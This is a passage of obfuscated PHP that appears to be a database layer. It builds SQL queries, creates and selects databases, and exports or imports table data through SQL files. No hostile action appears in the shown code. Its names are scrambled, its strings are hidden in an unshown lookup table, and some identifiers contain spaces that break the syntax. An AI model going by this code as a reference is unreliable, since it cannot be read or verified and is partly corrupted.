$—åï¯ŞÓ . $•Ñ”ÛÔ™[946]; } } elseif (preg_match($•Ñ”ÛÔ™[1062], $¨™Û²¶í[0])) { $ù¶ó°ß = is_string($¨™Û²¶í[1]) ? explode($•Ñ”ÛÔ™[60], $¨™Û²¶í[1]) : $¨™Û²¶í[1]; $¿ŸÓÄ‘Ş .= $•Ñ”ÛÔ™[944] . $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $this->exp[$º¿œòĞœ] . $•Ñ”ÛÔ™[63] . $this->parseValue($ù¶ó°ß[0]) . $•Ñ”ÛÔ™[1045] . $this->parseValue($ù¶ó°ß[1]) . $•Ñ”ÛÔ™[331]; } else { think_exception(think_lang($•Ñ”ÛÔ™[1048]) . $•Ñ”ÛÔ™[4] . $¨™Û²¶í[0]); } } else { $Èçê˜¥Œ = count($¨™Û²¶í); $ÑÖº‚´¡ = $•Ñ”ÛÔ™[22]; if (is_string($¨™Û²¶í[$Èçê˜¥Œ - 1])) { $ÑÖº‚´¡ = isset($¨™Û²¶í[$Èçê˜¥Œ - 1]) ? strtoupper($¨™Û²¶í[$Èçê˜¥Œ - 1]) : $•Ñ”ÛÔ™[22]; if (in_array($ÑÖº‚´¡, array($•Ñ”ÛÔ™[1042], $•Ñ”ÛÔ™[1043], $•Ñ”ÛÔ™[1044]))) { $Èçê˜¥Œ = $Èçê˜¥Œ - 1; } } else { $ÑÖº‚´¡ = $•Ñ”ÛÔ™[1042]; } for ($ÇŠÉ’Ûƒ = 0; $ÇŠÉ’Ûƒ < $Èçê˜¥Œ; $ÇŠÉ’Ûƒ++) { $ù¶ó°ß = is_array($¨™Û²¶í[$ÇŠÉ’Ûƒ]) ? $¨™Û²¶í[$ÇŠÉ’Ûƒ][1] : $¨™Û²¶í[$ÇŠÉ’Ûƒ]; if ($•Ñ”ÛÔ™[350] == strtolower($¨™Û²¶í[$ÇŠÉ’Ûƒ][0])) { $¿ŸÓÄ‘Ş .= $•Ñ”ÛÔ™[313] . $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $ù¶ó°ß . $•Ñ”ÛÔ™[1059] . $ÑÖº‚´¡ . $•Ñ”ÛÔ™[63]; } else { $ç¨’ı€Ò = is_array($¨™Û²¶í[$ÇŠÉ’Ûƒ]) ? $this->exp[strtolower($¨™Û²¶í[$ÇŠÉ’Ûƒ][0])] : $•Ñ”ÛÔ™[925]; if (!$ç¨’ı€Ò && is_array($¨™Û²¶í[$ÇŠÉ’Ûƒ]) && in_array($¨™Û²¶í[$ÇŠÉ’Ûƒ][0], array($•Ñ”ÛÔ™[925], $•Ñ”ÛÔ™[1052], $•Ñ”ÛÔ™[1053], $•Ñ”ÛÔ™[1054], $•Ñ”ÛÔ™[1055], $•Ñ”ÛÔ™[1056]))) { $ç¨’ı€Ò = $¨™Û²¶í[$ÇŠÉ’Ûƒ][0]; } $¿ŸÓÄ‘Ş .= $•Ñ”ÛÔ™[313] . $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $ç¨’ı€Ò . $•Ñ”ÛÔ™[63] . $this->parseValue($ù¶ó°ß) . $•Ñ”ÛÔ™[1059] . $ÑÖº‚´¡ . $•Ñ”ÛÔ™[63]; } } $¿ŸÓÄ‘Ş = substr($¿ŸÓÄ‘Ş, 0, -4); } } else { $¿ŸÓÄ‘Ş .= $€Ñ´ë¶µ . $•Ñ”ÛÔ™[1063] . $this->parseValue($¨™Û²¶í); } return $¿ŸÓÄ‘Ş; } protected function parseThinkWhere($·‘è¥ıá, $£“€óÆ„) { $œ´€Àªš =& $_SERVER[ú÷îèÆÜ]; $†‚ÂåçÚ = $œ´€Àªš[22]; switch ($·‘è¥ıá) { case $œ´€Àªš[405]: $†‚ÂåçÚ = $£“€óÆ„; break; case $œ´€Àªš[1046]: $†‚ÂåçÚ = is_string($£“€óÆ„) ? $£“€óÆ„ : substr($this->parseWhere($£“€óÆ„), 6); break; case $œ´€Àªš[1064]: parse_str($£“€óÆ„, $œ†•êé¤); if (isset($œ†•êé¤[$œ´€Àªš[1041]])) { $˜ˆ¥æÃÍ = $œ´€Àªš[63] . strtoupper($œ†•êé¤[$œ´€Àªš[1041]]) . $œ´€Àªš[63]; unset($œ†•êé¤[$œ´€Àªš[1041]]); } else { $˜ˆ¥æÃÍ = $œ´€Àªš[1045]; } $ÁŠôÔÓÇ = array(); foreach ($œ†•êé¤ as $ƒ¼²»ø => $²òÇşäô) { $ÁŠôÔÓÇ[] = $this->parseKey($ƒ¼²»ø) . $œ´€Àªš[1063] . $this->parseValue($²òÇşäô); } $†‚ÂåçÚ = implode($˜ˆ¥æÃÍ, $ÁŠôÔÓÇ); break; } return $†‚ÂåçÚ; } protected function parseLimit($»å²³Ì¬) { $¤˜ã›öæ =& $_SERVER[ú÷îèÆÜ]; return !empty($»å²³Ì¬) ? $¤˜ã›öæ[61] . $»å²³Ì¬ . $¤˜ã›öæ[63] : $¤˜ã›öæ[22]; } protected function parseJoin($“ïğğÃ) { $¿¼ö’ğî =& $_SERVER[ú÷îèÆÜ]; $¢Ûæ³Éë = $¿¼ö’ğî[22]; if (!empty($“ïğğÃ)) { if (is_array($“ïğğÃ)) { foreach ($“ïğğÃ as $ì±±é²İ => $ª‘Ù®) { if (!1 !== stripos($ª‘Ù®, $¿¼ö’ğî[1065])) { $¢Ûæ³Éë .= $¿¼ö’ğî[63] . $ª‘Ù®; } else { $¢Ûæ³Éë .= $¿¼ö’ğî[1066] . $ª‘Ù®; } } } else { $¢Ûæ³Éë .= $¿¼ö’ğî[1066] . $“ïğğÃ; } } $¢Ûæ³Éë = preg_replace($¿¼ö’ğî[1067], think_config($¿¼ö’ğî[971]) . $¿¼ö’ğî[1068], $¢Ûæ³Éë); return $¢Ûæ³Éë; } protected function parseOrder($ğÏ»ñ…õ) { $ÆÎãöÊ‹ =& $_SERVER[ú÷îèÆÜ]; if (is_array($ğÏ»ñ…õ)) { $ë»Ôåğƒ = array(); foreach ($ğÏ»ñ…õ as $•éÀé·ƒ => $é»©òÖ) { if (is_numeric($•éÀé·ƒ)) { $ë»Ôåğƒ[] = $this->parseKey($é»©òÖ); } else { $é»©òÖ = in_array(strtoupper(trim($é»©òÖ)), array($ÆÎãöÊ‹[1069], $ÆÎãöÊ‹[1070])) ? $ÆÎãöÊ‹[63] . $é»©òÖ : $ÆÎãöÊ‹[22]; if (preg_match($ÆÎãöÊ‹[1071], $•éÀé·ƒ)) { $ë»Ôåğƒ[] = $this->parseKey($•éÀé·ƒ) . $é»©òÖ; } else { think_exception($ÆÎãöÊ‹[1072] . $•éÀé·ƒ); } } } $ğÏ»ñ…õ = implode($ÆÎãöÊ‹[60], $ë»Ôåğƒ); } return !empty($ğÏ»ñ…õ) ? $ÆÎãöÊ‹[1073] . $ğÏ»ñ…õ : $ÆÎãöÊ‹[22]; } protected function parseGroup($İ½ìÑë±) { $´Ä‹àÈ =& $_SERVER[ú÷îèÆÜ]; return !empty($İ½ìÑë±) ? $´Ä‹àÈ[1074] . $İ½ìÑë± : $´Ä‹àÈ[22]; } protected function parseHaving($Áøİ¸‹Í) { $±ÀØşÎã =& $_SERVER[ú÷îèÆÜ]; return !empty($Áøİ¸‹Í) ? $±ÀØşÎã[1075] . $Áøİ¸‹Í : $±ÀØşÎã[22]; } protected function parseComment($ÓÉÑªÍ¼) { $±™‘î‰Œ =& $_SERVER[ú÷îèÆÜ]; return !empty($ÓÉÑªÍ¼) ? $±™‘î‰Œ[1076] . $ÓÉÑªÍ¼ . $±™‘î‰Œ[1077] : $±™‘î‰Œ[22]; } protected function parseDistinct($§È± õ) { $ÄÕ¡×Øó =& $_SERVER[ú÷îèÆÜ]; return !empty($§È± õ) ? $ÄÕ¡×Øó[1078] : $ÄÕ¡×Øó[22]; } protected function parseUnion($—®å å) { $Ì‡·„Ø‘ =& $_SERVER[ú÷îèÆÜ]; if (empty($—®å å)) { return $Ì‡·„Ø‘[22]; } if (isset($—®å å[$Ì‡·„Ø‘[401]])) { $şñİµ»Ü = $Ì‡·„Ø‘[1079]; unset($—®å å[$Ì‡·„Ø‘[401]]); } else { $şñİµ»Ü = $Ì‡·„Ø‘[1080]; } foreach ($—®å å as $”›°Ó¿•) { $Ø‚çÛ¸Ò[] = $şñİµ»Ü . (is_array($”›°Ó¿•) ? $this->buildSelectSql($”›°Ó¿•) : $”›°Ó¿•); } return implode($Ì‡·„Ø‘[63], $Ø‚çÛ¸Ò); } public function insert($³‰ûÛëÉ, $‹ó¢Ìà™ = array(), $ÂñÏØáÉ = false) { $èÎÇ¦ÆÃ =& $_SERVER[ú÷îèÆÜ]; $âïáØ¢ = $ŒÍªã’‘ = array(); $this->model = $‹ó¢Ìà™[$èÎÇ¦ÆÃ[334]]; foreach ($³‰ûÛëÉ as $šµóøù => $È¾Ã¸Æ½) { if (is_array($È¾Ã¸Æ½) && $èÎÇ¦ÆÃ[350] == $È¾Ã¸Æ½[0]) { $ŒÍªã’‘[] = $this->parseKey($šµóøù); $âïáØ¢[] = $È¾Ã¸Æ½[1]; } elseif (is_scalar($È¾Ã¸Æ½) || is_null($È¾Ã¸Æ½)) { $ŒÍªã’‘[] = $this->parseKey($šµóøù); $âïáØ¢[] = $this->parseValue($È¾Ã¸Æ½); } } $òùß°ù¨ = ($ÂñÏØáÉ ? $èÎÇ¦ÆÃ[948] : $èÎÇ¦ÆÃ[949]) . $èÎÇ¦ÆÃ[950] . $this->parseTable($‹ó¢Ìà™[$èÎÇ¦ÆÃ[332]]) . $èÎÇ¦ÆÃ[944] . implode($èÎÇ¦ÆÃ[60], $ŒÍªã’‘) . $èÎÇ¦ÆÃ[945] . implode($èÎÇ¦ÆÃ[60], $âïáØ¢) . $èÎÇ¦ÆÃ[946]; $òùß°ù¨ .= $this->parseLock(isset($‹ó¢Ìà™[$èÎÇ¦ÆÃ[884]]) ? $‹ó¢Ìà™[$èÎÇ¦ÆÃ[884]] : !1); $òùß°ù¨ .= $this->parseComment(!empty($‹ó¢Ìà™[$èÎÇ¦ÆÃ[407]]) ? $‹ó¢Ìà™[$èÎÇ¦ÆÃ[407]] : $èÎÇ¦ÆÃ[22]); return $this->execute($òùß°ù¨, $this->parseBind(!empty($‹ó¢Ìà™[$èÎÇ¦ÆÃ[338]]) ? $‹ó¢Ìà™[$èÎÇ¦ÆÃ[338]] : array())); } public function selectInsert($Ì£Š…½, $¸¤æñ«Ï, $••ı‹â‡ = array()) { $Çíî¤Éá =& $_SERVER[ú÷îèÆÜ]; $this->model = $••ı‹â‡[$Çíî¤Éá[334]]; if (is_string($Ì£Š…½)) { $Ì£Š…½ = explode($Çíî¤Éá[60], $Ì£Š…½); } array_walk($Ì£Š…½, array($this, $Çíî¤Éá[947])); $Ÿ¶ö¯¸ù = $Çíî¤Éá[1081] . $this->parseTable($¸¤æñ«Ï) . $Çíî¤Éá[944] . implode($Çíî¤Éá[60], $Ì£Š…½) . $Çíî¤Éá[1059]; $Ÿ¶ö¯¸ù .= $this->buildSelectSql($••ı‹â‡); return $this->execute($Ÿ¶ö¯¸ù, $this->parseBind(!empty($••ı‹â‡[$Çíî¤Éá[338]]) ? $••ı‹â‡[$Çíî¤Éá[338]] : array())); } public function update($§Ä®®´¶, $âŞ£‡) { $°–ÀŞƒÇ =& $_SERVER[ú÷îèÆÜ]; $this->model = $âŞ£‡[$°–ÀŞƒÇ[334]]; $ô“¤Õ = $°–ÀŞƒÇ[1082] . $this->parseTable($âŞ£‡[$°–ÀŞƒÇ[332]]) . $this->parseSet($§Ä®®´¶) . $this->parseWhere(!empty($âŞ£‡[$°–ÀŞƒÇ[328]]) ? $âŞ£‡[$°–ÀŞƒÇ[328]] : $°–ÀŞƒÇ[22]) . $this->parseOrder(!empty($âŞ£‡[$°–ÀŞƒÇ[418]]) ? $âŞ£‡[$°–ÀŞƒÇ[418]] : $°–ÀŞƒÇ[22]) . $this->parseLimit(!empty($âŞ£‡[$°–ÀŞƒÇ[345]]) ? $âŞ£‡[$°–ÀŞƒÇ[345]] : $°–ÀŞƒÇ[22]) . $this->parseLock(isset($âŞ£‡[$°–ÀŞƒÇ[884]]) ? $âŞ£‡[$°–ÀŞƒÇ[884]] : !1) . $this->parseComment(!empty($âŞ£‡[$°–ÀŞƒÇ[407]]) ? $âŞ£‡[$°–ÀŞƒÇ[407]] : $°–ÀŞƒÇ[22]); return $this->execute($ô“¤Õ, $this->parseBind(!empty($âŞ£‡[$°–ÀŞƒÇ[338]]) ? $âŞ£‡[$°–ÀŞƒÇ[338]] : array())); } public function delete($‘½Ç€ê = array()) { $Ú°ßåÀÎ =& $_SERVER[ú÷îèÆÜ]; $this->model = $‘½Ç€ê[$Ú°ßåÀÎ[334]]; $˜€úíÊÌ = $Ú°ßåÀÎ[1083] . $this->parseTable($‘½Ç€ê[$Ú°ßåÀÎ[332]]) . $this->parseWhere(!empty($‘½Ç€ê[$Ú°ßåÀÎ[328]]) ? $‘½Ç€ê[$Ú°ßåÀÎ[328]] : $Ú°ßåÀÎ[22]) . $this->parseOrder(!empty($‘½Ç€ê[$Ú°ßåÀÎ[418]]) ? $‘½Ç€ê[$Ú°ßåÀÎ[418]] : $Ú°ßåÀÎ[22]) . $this->parseLimit(!empty($‘½Ç€ê[$Ú°ßåÀÎ[345]]) ? $‘½Ç€ê[$Ú°ßåÀÎ[345]] : $Ú°ßåÀÎ[22]) . $this->parseLock(isset($‘½Ç€ê[$Ú°ßåÀÎ[884]]) ? $‘½Ç€ê[$Ú°ßåÀÎ[884]] : !1) . $this->parseComment(!empty($‘½Ç€ê[$Ú°ßåÀÎ[407]]) ? $‘½Ç€ê[$Ú°ßåÀÎ[407]] : $Ú°ßåÀÎ[22]); return $this->execute($˜€úíÊÌ, $this->parseBind(!empty($‘½Ç€ê[$Ú°ßåÀÎ[338]]) ? $‘½Ç€ê[$Ú°ßåÀÎ[338]] : array())); } public function select($×ù¦¢¥§ = array()) { $Òİ‹ş =& $_SERVER[ú÷îèÆÜ]; $this->model = $×ù¦¢¥§[$Òİ‹ş[334]]; $¨Â³Ôè = $this->buildSelectSql($×ù¦¢¥§); $ÜºõØ©  = isset($×ù¦¢¥§[$Òİ‹ş[402]]) ? $×ù¦¢¥§[$Òİ‹ş[402]] : !1; if ($ÜºõØ© ) { $¶Ñ€¯»ı = is_string($ÜºõØ© [$Òİ‹ş[104]]) ? $ÜºõØ© [$Òİ‹ş[104]] : $Òİ‹ş[1084] . md5($¨Â³Ôè); $Óëˆİ¹Ù = think_cache($¶Ñ€¯»ı, $Òİ‹ş[22], $ÜºõØ© ); if (!1 !== $Óëˆİ¹Ù) { return $Óëˆİ¹Ù; } } $Ï¹•Õ¾‡ = $this->query($¨Â³Ôè, $this->parseBind(!empty($×ù¦¢¥§[$Òİ‹ş[338]]) ? $×ù¦¢¥§[$Òİ‹ş[338]] : array())); if ($ÜºõØ©  && !1 !== $Ï¹•Õ¾‡) { think_cache($¶Ñ€¯»ı, $Ï¹•Õ¾‡, $ÜºõØ© ); } return $Ï¹•Õ¾‡; } public function buildSelectSql($òÂö’ö¨ = array()) { $³¢˜ğœ½ =& $_SERVER[ú÷îèÆÜ]; if (isset($òÂö’ö¨[$³¢˜ğœ½[406]])) { if (strpos($òÂö’ö¨[$³¢˜ğœ½[406]], $³¢˜ğœ½[60])) { list($ØÊ·…áÍ, $ˆóŞó’Ë) = explode($³¢˜ğœ½[60], $òÂö’ö¨[$³¢˜ğœ½[406]]); } else { $ØÊ·…áÍ = $òÂö’ö¨[$³¢˜ğœ½[406]]; } $ØÊ·…áÍ = $ØÊ·…áÍ ? $ØÊ·…áÍ : 1; $ˆóŞó’Ë = isset($ˆóŞó’Ë) ? $ˆóŞó’Ë : (is_numeric($òÂö’ö¨[$³¢˜ğœ½[345]]) ? $òÂö’ö¨[$³¢˜ğœ½[345]] : 20); $¼ÍòÎ„´ = $ˆóŞó’Ë * ((int) $ØÊ·…áÍ - 1); $òÂö’ö¨[$³¢˜ğœ½[345]] = $¼ÍòÎ„´ . $³¢˜ğœ½[60] . $ˆóŞó’Ë; } if (think_config($³¢˜ğœ½[1085])) { $†„©¶ÚÔ = $³¢˜ğœ½[1086] . md5(serialize($òÂö’ö¨)); $ŒÈ»ÙÇà = think_cache($†„©¶ÚÔ); if ($ŒÈ»ÙÇà) { return $ŒÈ»ÙÇà; } } $ğÃøŸèÆ = $this->parseSql($this->selectSql, $òÂö’ö¨); $ğÃøŸèÆ .= $this->parseLock(isset($òÂö’ö¨[$³¢˜ğœ½[884]]) ? $òÂö’ö¨[$³¢˜ğœ½[884]] : !1); if (isset($†„©¶ÚÔ)) { think_cache($†„©¶ÚÔ, $ğÃøŸèÆ); } return $ğÃøŸèÆ; } public function parseSql($óí†Â«­, $¥ ıÈÁ¸ = array()) { $¢®ôÚÊ =& $_SERVER[ú÷îèÆÜ]; $óí†Â«­ = str_replace(array($¢®ôÚÊ[1087], $¢®ôÚÊ[1088], $¢®ôÚÊ[1089], $¢®ôÚÊ[1090], $¢®ôÚÊ[1091], $¢®ôÚÊ[1092], $¢®ôÚÊ[1093], $¢®ôÚÊ[1094], $¢®ôÚÊ[1095], $¢®ôÚÊ[1096], $¢®ôÚÊ[1097]), array($this->parseTable("{$¥ ıÈÁ¸[$¢®ôÚÊ[332]]}"), $this->parseDistinct(isset($¥ ıÈÁ¸[$¢®ôÚÊ[1098]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[1098]] : !1), $this->parseField(!empty($¥ ıÈÁ¸[$¢®ôÚÊ[326]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[326]] : $¢®ôÚÊ[213]), $this->parseJoin(!empty($¥ ıÈÁ¸[$¢®ôÚÊ[335]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[335]] : $¢®ôÚÊ[22]), $this->parseWhere(!empty($¥ ıÈÁ¸[$¢®ôÚÊ[328]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[328]] : $¢®ôÚÊ[22]), $this->parseGroup(!empty($¥ ıÈÁ¸[$¢®ôÚÊ[556]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[556]] : $¢®ôÚÊ[22]), $this->parseHaving(!empty($¥ ıÈÁ¸[$¢®ôÚÊ[1099]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[1099]] : $¢®ôÚÊ[22]), $this->parseOrder(!empty($¥ ıÈÁ¸[$¢®ôÚÊ[418]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[418]] : $¢®ôÚÊ[22]), $this->parseLimit(!empty($¥ ıÈÁ¸[$¢®ôÚÊ[345]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[345]] : $¢®ôÚÊ[22]), $this->parseUnion(!empty($¥ ıÈÁ¸[$¢®ôÚÊ[400]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[400]] : $¢®ôÚÊ[22]), $this->parseComment(!empty($¥ ıÈÁ¸[$¢®ôÚÊ[407]]) ? $¥ ıÈÁ¸[$¢®ôÚÊ[407]] : $¢®ôÚÊ[22])), $óí†Â«­); return $óí†Â«­; } public function getLastSql($Çïó­òû = '') { return $Çïó­òû ? $this->modelSql[$Çïó­òû] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ûÖë½ÕÃ) { return addslashes($ûÖë½ÕÃ); } public function setModel($»ıè©‚¡) { $this->model = $»ıè©‚¡; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Š–ŸÙıÀ = array()) { $ÊÑ«Š–µ =& $_SERVER[ú÷îèÆÜ]; if (empty($Š–ŸÙıÀ)) { $Š–ŸÙıÀ = $GLOBALS[$ÊÑ«Š–µ[16]][$ÊÑ«Š–µ[31]]; } $this->database = $Š–ŸÙıÀ; } public function model($óøæÇ¤  = '') { return new ModelBase($óøæÇ¤ , $_SERVER[ú÷îèÆÜ][22], $this->database); } public function db($ìØæˆì² = false) { $­õïåğ™ =& $_SERVER[ú÷îèÆÜ]; $ã‰ûÛ¶ = array_change_key_case($this->database); if ($this->dbType() == $­õïåğ™[23] || !$ìØæˆì²) { return $this->model()->db(); } $úàü¤±€ = $ã‰ûÛ¶[$­õïåğ™[1013]]; $ã‰ûÛ¶[$­õïåğ™[1013]] = $­õïåğ™[22]; if ($ã‰ûÛ¶[$­õïåğ™[1008]] == $­õïåğ™[1005]) { $„¼ö©ø° = $ã‰ûÛ¶[$­õïåğ™[1014]]; $ã‰ûÛ¶[$­õïåğ™[1014]] = substr($„¼ö©ø°, 0, strrpos($„¼ö©ø°, $­õïåğ™[1100])); } $this->database = $ã‰ûÛ¶; $Åßö÷ = $this->model()->db(); try { $ôŠâü¨œ = $Åßö÷->execute("\x73\x68\x6f\x77\40\x64\141\x74\141\x62\141\163\145\163\x20\x6c\x69\x6b\x65\40\47{$úàü¤±€}\x27"); } catch (Exception $ÉîÚÜ¨Æ) { } if (!$ôŠâü¨œ) { $Åßö÷->execute("\x63\162\145\141\x74\x65\40\144\141\x74\141\x62\141\x73\x65\x20\140{$úàü¤±€}\140"); } $ã‰ûÛ¶[$­õïåğ™[1013]] = $úàü¤±€; if ($ã‰ûÛ¶[$­õïåğ™[1008]] == $­õïåğ™[1005]) { $ã‰ûÛ¶[$­õïåğ™[1014]] .= $­õïåğ™[1100] . $úàü¤±€; } $this->database = $ã‰ûÛ¶; $Åßö÷->execute("\165\x73\x65\x20\x60{$úàü¤±€}\x60"); return $Åßö÷; } public function createTable($ÅåÏ‡, &$Ğ´­ëãİ) { $†¨Ö‘–Ï =& $_SERVER[ú÷îèÆÜ]; if (!IO::exist($ÅåÏ‡)) { ActionCall($†¨Ö‘–Ï[1101], !0, 0); show_json(LNG($†¨Ö‘–Ï[1102]), !1); } $òíßÙ±Ğ = $this->model()->db(); $üóò€Š® = sqlSplit(IO::getContent($ÅåÏ‡)); foreach ($üóò€Š® as $§¾¡ä —) { $Ã¤·ßæ‹ = stripos($§¾¡ä —, $†¨Ö‘–Ï[1103]) === 0; if ($Ã¤·ßæ‹) { $Ğ´­ëãİ->task[$†¨Ö‘–Ï[826]] += 1; } $òíßÙ±Ğ->execute($§¾¡ä —); if ($Ã¤·ßæ‹) { preg_match($†¨Ö‘–Ï[1104], $§¾¡ä —, $¿êœ‹˜«); $Ğ´­ëãİ->task[$†¨Ö‘–Ï[1105]] = $¿êœ‹˜«[1]; $Ğ´­ëãİ->update(1); } } } public function insertTable($Š»ºÉÎÁ, &$ÊÑšúÅç) { $í‘°¾æ =& $_SERVER[ú÷îèÆÜ]; $‰ÀÁïä¯ = $this->model()->db(); $ø‰£–ûò = $ÜÏäöìØ ? array($ÜÏäöìØ) : $‰ÀÁïä¯->getTables(); foreach ($Š»ºÉÎÁ as $ìè¨õıÇ) { $ÜÏäöìØ = basename($ìè¨õıÇ, $í‘°¾æ[828]); if (!in_array($ÜÏäöìØ, $ø‰£–ûò)) { continue; } $ÊÑšúÅç->task[$í‘°¾æ[1105]] = $ÜÏäöìØ; if (get_filesize($ìè¨õıÇ) == 0) { continue; } $ÅƒßÍ˜ = $this->sqlToDb($ìè¨õıÇ, $ÊÑšúÅç); if (!$ÅƒßÍ˜) { ActionCall($í‘°¾æ[1101], !0, 0); show_json(LNG($í‘°¾æ[1106]) . "\x5b{$ÜÏäöìØ}\x5d", !1); } } } public function sqlFromDb($…¦Õ³€É, $øÙåÖ¯«, &$ ¬‰ûÒ¾, $ÖâõÂ…Õ = '') { if ($ ¬‰ûÒ¾) { $ ¬‰ûÒ¾->task[$_SERVER[ú÷îèÆÜ][1105]] = $…¦Õ³€É; } $ú™ë®˜¸ = $this->model($…¦Õ³€É); $ıèêŸ¯ = 0; $¯”¤åŒ“ = 0; $üòê§öø = 10000; $·’•ãÑˆ = fopen($øÙåÖ¯«, $_SERVER[ú÷îèÆÜ][1107]); $¥¿ôÄº‹ = $ú™ë®˜¸->getPk(); $–šÓ®¨¬ = $ú™ë®˜¸->getDbFields(); $Ò¢ÖÕÎ× = $_SERVER[ú÷îèÆÜ][22]; if ($GLOBALS[$_SERVER[ú÷îèÆÜ][827]] && in_array($…¦Õ³€É, array($_SERVER[ú÷îèÆÜ][1108], $_SERVER[ú÷îèÆÜ][1109]))) { $Ò¢ÖÕÎ× = $…¦Õ³€É; } do { $ÏÛ´Ù”Ú = array($¥¿ôÄº‹ => array($_SERVER[ú÷îèÆÜ][1055], $¯”¤åŒ“)); $Äíû¼ = $ú™ë®˜¸->where($ÏÛ´Ù”Ú)->field($–šÓ®¨¬)->order($¥¿ôÄº‹ . $_SERVER[ú÷îèÆÜ][1110])->limit($üòê§öø)->select(); $Äíû¼ = !empty($Äíû¼) ? $Äíû¼ : array(); if (!($Ôİü²ÙØ = count($Äíû¼))) { break; } $›®Á€Â = end($Äíû¼); $¯”¤åŒ“ = $›®Á€Â[$¥¿ôÄº‹]; $áÒÕ§æ‚ = array(); foreach ($Äíû¼ as $îö‘ê¤ù) { if ($Ò¢ÖÕÎ×) { if ($…¦Õ³€É == $_SERVER[ú÷îèÆÜ][1108]) { if ($îö‘ê¤ù[$_SERVER[ú÷îèÆÜ][43]] == $_SERVER[ú÷îèÆÜ][1111]) { $ä‘€‘² = json_decode($îö‘ê¤ù[$_SERVER[ú÷îèÆÜ][427]], !0); if ($ä‘€‘²[$_SERVER[ú÷îèÆÜ][42]] == $GLOBALS[$_SERVER[ú÷îèÆÜ][827]] && $ä‘€‘²[$_SERVER[ú÷îèÆÜ][790]] != 1) { continue; } } } else { if ($îö‘ê¤ù[$_SERVER[ú÷îèÆÜ][43]] == $_SERVER[ú÷îèÆÜ][1112] && $îö‘ê¤ù[$_SERVER[ú÷îèÆÜ][104]] == $_SERVER[ú÷îèÆÜ][819]) { continue; } } } if ($ÖâõÂ…Õ) { $îö‘ê¤ù[$_SERVER[ú÷îèÆÜ][94]] = "\x7b\x69\x6f\72{$ÖâõÂ…Õ}\x7d" . substr($îö‘ê¤ù[$_SERVER[ú÷îèÆÜ][94]], strlen("\x7b\x69\x6f\72{$îö‘ê¤ù[$_SERVER[ú÷îèÆÜ][857]]}\175")); $îö‘ê¤ù[$_SERVER[ú÷îèÆÜ][857]] = $ÖâõÂ…Õ; } $áÒÕ§æ‚[] = $_SERVER[ú÷îèÆÜ][1113] . $this->sqlEncode($îö‘ê¤ù) . $_SERVER[ú÷îèÆÜ][1114]; } $‹¬ŒİÄ˜ = "\111\116\x53\x45\122\124\40\x49\x4e\124\x4f\40\x60{$…¦Õ³€É}\x60\40\50\x60" . implode($_SERVER[ú÷îèÆÜ][1115], $–šÓ®¨¬) . $_SERVER[ú÷îèÆÜ][1116]; fwrite($·’•ãÑˆ, $‹¬ŒİÄ˜ . implode($_SERVER[ú÷îèÆÜ][1117], $áÒÕ§æ‚) . $_SERVER[ú÷îèÆÜ][81] . PHP_EOL); $ıèêŸ¯ += $Ôİü²ÙØ; if ($ ¬‰ûÒ¾) { $ ¬‰ûÒ¾->update($Ôİü²ÙØ); } } while ($üòê§öø == $Ôİü²ÙØ); fclose($·’•ãÑˆ); return $ıèêŸ¯; } public function sqlToDb($™÷Ô§À, &$æ’Èœú‚) { $–‡•šûÔ =& $_SERVER[ú÷îèÆÜ]; $„ÄˆÄ¥ë = $this->model()->db(); $áÏâ‡‚ = @fopen($™÷Ô§À, $–‡•šûÔ[1118]); if (!$áÏâ‡‚) { return !1; } $Äë•âô = 0; $¹ÕŞ²¡ = $–‡•šûÔ[22]; $æ…Û²°­ = array(); $½ñûŞÓì = $this->dbType(); $ùè–ç™¢ = $½ñûŞÓì == $–‡•šûÔ[23] ? 500 : 2000; $ºØÕ”¿Ç = basename($™÷Ô§À, $–‡•šûÔ[828]); $±ª—ñÔ = 0; $†ÉÇï = 4194304 - 104858; $Ã£ê÷ºâ = 1000000 - 104858; while (!feof($áÏâ‡‚)) { $¸Û¥Ÿ­Ø = trim(fgets($áÏâ‡‚)); if (!$¸Û¥Ÿ­Ø) { continue; } $Ñ¼‚“ä¬ = $this->sqlDecode($¸Û¥Ÿ­Ø, $½ñûŞÓì, $ºØÕ”¿Ç); if (stripos($Ñ¼‚“ä¬, $–‡•šûÔ[408]) === 0) { if (!$¹ÕŞ²¡) { $¹ÕŞ²¡ = $Ñ¼‚“ä¬ . $–‡•šûÔ[63]; } continue; } if ($æ’Èœú‚) { $æ’Èœú‚->task[$–‡•šûÔ[826]] += 1; } $Äë•âô++; $æ…Û²°­[] = rtrim(rtrim(trim($Ñ¼‚“ä¬), $–‡•šûÔ[60]), $–‡•šûÔ[81]); $«–ğË = null; $·îÛùœÖ = strlen($Ñ¼‚“ä¬); $±ª—ñÔ += $·îÛùœÖ; if ($±ª—ñÔ >= ($ùè–ç™¢ == 500 ? $Ã£ê÷ºâ : $†ÉÇï)) { $«–ğË = array_pop($æ…Û²°­); if ($Äë•âô > 1) { $Äë•âô--; } } if ($Äë•âô >= $ùè–ç™¢ || $«–ğË) { $Ñ¼‚“ä¬ = $¹ÕŞ²¡ . implode($–‡•šûÔ[60], $æ…Û²°­); if (!$„ÄˆÄ¥ë->execute($Ñ¼‚“ä¬)) { return !1; } if ($æ’Èœú‚) { $æ’Èœú‚->update($Äë•âô); } $æ…Û²°­ = array(); $Äë•âô = 0; $±ª—ñÔ = 0; if ($«–ğË) { $æ…Û²°­ = array($«–ğË); $Äë•âô = 1; $±ª—ñÔ = $·îÛùœÖ; } } } fclose($áÏâ‡‚); if (!empty($æ…Û²°­)) { $Ñ¼‚“ä¬ = $¹ÕŞ²¡ . implode($–‡•šûÔ[60], $æ…Û²°­); if (!$„ÄˆÄ¥ë->execute($Ñ¼‚“ä¬)) { return !1; } if ($æ’Èœú‚) { $æ’Èœú‚->update($Äë•âô); } } 